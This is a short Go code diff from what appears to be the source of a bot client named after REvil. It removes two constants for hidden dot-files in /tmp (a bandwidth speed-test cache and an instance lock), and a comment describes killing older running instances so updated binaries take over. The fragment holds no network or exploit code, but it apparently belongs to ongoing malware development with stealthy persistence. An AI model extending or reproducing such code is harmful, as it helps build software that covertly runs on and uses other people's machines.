@@ -85,14 +85,6 @@ func revilProc() string {
 	return "unknown"
 }
 
-// speedCachePath is the hidden file used to persist the speed test result
-// across reconnections, avoiding repeated speed tests that waste bandwidth.
-const speedCachePath = "/tmp/.net_metric"
-
-// instanceLockPath is the PID lock file to ensure only one bot instance runs.
-// Uses the same /tmp namespace so it's automatically cleaned on reboot.
-const instanceLockPath = "/tmp/.net_lock"
-
 // revilSingleInstance ensures only one instance of the bot is running.
 // If an older instance is found, it is killed so the new one takes over.
 // This allows seamless binary updates — the new version always wins.
